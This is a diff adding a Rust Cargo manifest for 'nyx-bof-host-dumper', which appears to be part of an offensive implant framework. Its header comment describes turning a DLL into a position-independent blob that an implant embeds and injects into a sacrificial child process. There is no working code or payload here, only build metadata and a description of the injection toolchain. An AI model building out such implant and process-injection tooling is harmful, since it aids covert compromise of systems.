@@ -1,0 +1,33 @@
+# nyx-bof-host-dumper — host-side raw-image extractor for the B3 bof-host.
+#
+# Converts the built `nyx_bof_host.dll` (cdylib, x86_64-pc-windows-gnu,
+# nightly + -Zbuild-std) into `bof-host.bin`, the self-contained PIC blob the
+# implant embeds via include_bytes! and section-delivers into a sacrificial
+# child process.
+#
+# What it emits (see nyx-pic-dumper src/relayout.rs for the full algorithm):
+#   [compacted reachable code, nyx_bof_host_entry first]
+#   [16-byte-aligned .rdata constants the code references]
+#   every RIP-relative displacement and direct branch re-patched to the new
+#   layout; entry prologue at blob offset 0.
+#
+# The crate is a member of the bof-host workspace (host target, std), so it
+# never affects the root workspace. Zero external dependencies and ZERO own
+# engine code: PE parsing, the x86-64 length/operand decoder, and the BFS
+# reachability walk are SHARED with the LAYER2 dumper
+# (crates/nyx-loader/pic-loader/dumper) via #[path] module includes in
+# src/main.rs — one validated engine, one convention; only the entry name,
+# input/output names, and messages differ.
+
+[package]
+name = "nyx-bof-host-dumper"
+version = "0.1.0"
+edition = "2021"
+publish = false
+description = "Extracts the reachable PIC closure of nyx_bof_host.dll into bof-host.bin"
+
+[[bin]]
+name = "nyx-bof-host-dumper"
+path = "src/main.rs"
+
+[dependencies]
